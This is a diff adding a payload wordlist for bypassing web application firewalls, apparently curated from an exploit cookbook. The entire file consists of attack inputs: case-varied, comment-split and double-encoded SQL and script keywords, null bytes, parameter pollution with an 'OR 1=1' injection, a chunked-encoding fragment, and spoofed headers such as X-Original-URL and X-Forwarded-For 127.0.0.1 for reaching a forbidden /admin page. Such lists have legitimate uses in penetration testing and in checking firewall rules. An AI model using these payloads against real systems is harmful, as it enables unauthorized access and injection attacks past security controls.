@@ -1,0 +1,60 @@
+# WAF Bypass Payloads - Curated from exploit-cookbook
+# Source: waf-bypass-tamper.md + 403-bypass.md
+
+# Case manipulation
+SeLeCt
+UnIoN
+ScRiPt
+aLeRt
+
+# Comment injection
+sel/**/ect
+un/**/ion
+scr/**/ipt
+<scr<!---->ipt>
+
+# Encoding bypass
+%53%45%4c%45%43%54
+&#83;&#69;&#76;&#69;&#67;&#84;
+SELECT (URL encoded)
+
+# Double encoding
+%2553%2545%254c%2545%2543%2554
+%253Cscript%253E
+
+# Null byte
+%00
+%0a
+%0d
+%09
+
+# HPP (HTTP Parameter Pollution)
+id=1&id=2
+name=test&name=1%20OR%201=1
+
+# Chunked transfer
+Transfer-Encoding: chunked
+0
+
+
+S
+UNION
+0
+
+
+
+# Boundary bypass
+------WebKitFormBoundary
+------WebKitFormBoundary7MA4YWxkTrZu0gW
+
+# 403 bypass methods
+GET /admin HTTP/1.1
+X-Original-URL: /admin
+X-Rewrite-URL: /admin
+X-Forwarded-For: 127.0.0.1
+X-Custom-IP-Authorization: 127.0.0.1
+X-Real-IP: 127.0.0.1
+X-Forwarded-Host: 127.0.0.1
+X-Remote-IP: 127.0.0.1
+X-Remote-Addr: 127.0.0.1
+X-Client-IP: 127.0.0.1
